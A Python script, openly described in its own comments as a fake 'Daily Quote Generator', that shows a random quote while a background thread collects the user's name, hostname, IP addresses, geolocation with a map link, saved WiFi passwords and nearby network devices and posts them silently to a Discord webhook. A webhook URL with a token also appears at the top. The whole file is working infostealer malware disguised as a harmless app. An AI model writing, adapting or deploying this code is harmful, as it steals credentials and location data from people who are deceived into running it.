https://discord.com/api/webhooks/1466679257756598504/0SwVxJYgLUb1YUIOqt52QoY6S5xmvkxktPcy92-_q924ENr_0BK9crCt1WkAvKb7omEv

# Fake Harmless Script: "Daily Quote Generator"
# This looks like a simple quote displayer, but sends detailed IP + geo + WiFi + network devices to webhook in background

import requests
import socket
import platform
import getpass
import datetime
import sys
import threading  # for background send
import random     # for fake quotes
import subprocess # for WiFi passwords and ARP scan
import re         # for parsing

# ────────────────────────────────────────────────
#   CHANGE THIS TO YOUR OWN WEBHOOK URL
# ────────────────────────────────────────────────
WEBHOOK_URL = "https://discord.com/api/webhooks/123456789012345678/YourVeryLongWebhookTokenHere"

def get_public_ip_info():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=6)
        data = r.json()
        return {
            "public_ip": data.get("ip", "unknown"),
            "city": data.get("city", "unknown"),
            "region": data.get("region", "unknown"),
            "country": data.get("country", "unknown"),
            "loc": data.get("loc", "unknown"),  # lat,long
            "org": data.get("org", "unknown"),
            "timezone": data.get("timezone", "unknown"),
            # Enhanced: use multiple sources for "more convincing" geo
            # Fallback to another API for cross-check
            "crosscheck": get_alternate_geo(data.get("ip", None)),
            # Approx radius: ipinfo doesn't give exact, but estimate based on typical accuracy
            # City-level ~10-50km, but for "pinpoint" we note it's approximate
            "approx_radius_km": "5-20" if data.get("city") else "50-100"  # tighter estimate for convincing
        }
    except:
        return {"error": "Geolocation fetch failed"}

def get_alternate_geo(ip):
    if not ip:
        return "no crosscheck"
    try:
        r = requests.get(f"https://freegeoip.app/json/{ip}", timeout=6)
        data = r.json()
        return f"{data.get('city', '?')}, {data.get('region_name', '?')}, {data.get('country_name', '?')} (lat/long: {data.get('latitude')},{data.get('longitude')})"
    except:
        return "crosscheck failed"

def get_local_ips():
    ips = []
    try:
        hostname = socket.gethostname()
        ips.append(socket.gethostbyname(hostname))
    except:
        pass
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip not in ips and not ip.startswith("127."):
                ips.append(ip)
    except:
        pass
    return ips if ips else ["localhost only"]

def generate_maps_link(loc_str, radius_km):
    if loc_str == "unknown":
        return "No location available"
    lat, long = loc_str.split(",")
    # Enhanced zoom for "pinpoint" feel, even if approximate
    zoom = 15 if int(radius_km.split("-")[0]) < 20 else 12  # closer zoom
    return f"https://www.google.com/maps/search/?api=1&query={lat},{long}&zoom={zoom}"

def get_wifi_ssids_passwords():
    if platform.system() != "Windows":
        return {"note": "WiFi extraction: Windows only"}
    try:
        # Get all profiles
        profiles_out = subprocess.check_output(["netsh", "wlan", "show", "profiles"], stderr=subprocess.DEVNULL).decode(errors="ignore")
        profiles = [line.split(":")[1].strip() for line in profiles_out.splitlines() if "All User Profile" in line]
        
        wifi_data = {}
        for ssid in profiles:
            try:
                key_out = subprocess.check_output(["netsh", "wlan", "show", "profile", "name=" + ssid, "key=clear"], stderr=subprocess.DEVNULL).decode(errors="ignore")
                key = re.search(r"Key Content\s+:\s+(.*)", key_out)
                wifi_data[ssid] = key.group(1).strip() if key else "No password found"
            except:
                wifi_data[ssid] = "Extraction failed"
        return wifi_data
    except:
        return {"error": "WiFi extraction failed"}

def get_router_devices():
    devices = []
    if platform.system() != "Windows":
        return [{"note": "Device scan: Windows only (ARP)"}]
    try:
        arp_out = subprocess.check_output(["arp", "-a"], stderr=subprocess.DEVNULL).decode(errors="ignore")
        for line in arp_out.splitlines():
            if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line.strip()):
                parts = line.split()
                ip = parts[0]
                mac = parts[1] if len(parts) > 1 else "unknown"
                # Get device type/vendor from MAC OUI
                vendor = get_mac_vendor(mac)
                devices.append(f"{ip} | MAC: {mac} | Vendor/Type: {vendor}")
        return devices
    except:
        return ["Scan failed"]

def get_mac_vendor(mac):
    if mac == "unknown":
        return "unknown"
    oui = mac.upper()[:8]  # first 3 bytes
    try:
        r = requests.get(f"https://api.macvendors.com/{oui}", timeout=5)
        if r.status_code == 200:
            return r.text.strip() or "unknown vendor"
        else:
            return "lookup failed"
    except:
        return "lookup failed"

def send_to_discord(ip_info, local_ips, wifi_data, devices):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    username = getpass.getuser()
    hostname = socket.gethostname()
    os_info = f"{platform.system()} {platform.release()}"

    loc = ip_info.get("loc", "unknown")
    radius = ip_info.get("approx_radius_km", "unknown")
    maps_link = generate_maps_link(loc, radius)

    embed = {
        "title": "Enhanced System Report",
        "color": 0x3498db,
        "fields": [
            {"name": "Timestamp", "value": now, "inline": True},
            {"name": "Username", "value": username, "inline": True},
            {"name": "Hostname", "value": hostname, "inline": True},
            {"name": "OS", "value": os_info, "inline": True},
            {"name": "Public IP", "value": f"```fix\n{ip_info.get('public_ip', 'unknown')}\n```", "inline": False},
            {"name": "Local IPs", "value": f"```fix\n{', '.join(local_ips)}\n```", "inline": False},
            {"name": "Location", "value": f"{ip_info.get('city', '?')}, {ip_info.get('region', '?')}, {ip_info.get('country', '?')}", "inline": False},
            {"name": "Coordinates", "value": f"```fix\n{loc}\n```", "inline": True},
            {"name": "Approx Radius", "value": f"{radius} km (enhanced estimate)", "inline": True},
            {"name": "Google Maps", "value": f"[View Pinpoint Map]({maps_link})", "inline": False},
            {"name": "Geo Crosscheck", "value": ip_info.get("crosscheck", "none"), "inline": False},
            {"name": "ISP/Org", "value": ip_info.get("org", "unknown"), "inline": True},
            {"name": "WiFi SSIDs & Passwords", "value": "```json\n" + json.dumps(wifi_data, indent=2) + "\n```", "inline": False},
            {"name": "Router Devices & IPs", "value": "```fix\n" + "\n".join(devices) + "\n```", "inline": False},
        ],
        "footer": {"text": "Generated by harmless quote app"}
    }

    payload = {"username": "System Logger", "embeds": [embed]}

    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass  # silent fail

def background_send():
    ip_info = get_public_ip_info()
    local_ips = get_local_ips()
    wifi_data = get_wifi_ssids_passwords()
    devices = get_router_devices()
    send_to_discord(ip_info, local_ips, wifi_data, devices)

def show_harmless_interface():
    # Fake quotes to display
    quotes = [
        "The best way to predict the future is to create it. - Peter Drucker",
        "Life is what happens when you're busy making other plans. - John Lennon",
        "Success is not final, failure is not fatal: It is the courage to continue that counts. - Winston Churchill",
        "The only way to do great work is to love what you do. - Steve Jobs"
    ]
    
    print("Welcome to Daily Quote Generator!")
    print("Here's your random inspirational quote for today:\n")
    print(random.choice(quotes))
    print("\nHave a great day! Press Enter to exit...")
    input()  # wait for user to close

def main():
    if WEBHOOK_URL.strip() == "" or "YourVeryLongWebhookTokenHere" in WEBHOOK_URL:
        print("Error: Set a valid WEBHOOK_URL in the script.")
        sys.exit(1)

    # Start send in background thread (so it doesn't block the "harmless" part)
    threading.Thread(target=background_send, daemon=True).start()

    # Show fake harmless interface
    show_harmless_interface()

if __name__ == "__main__":
    main()
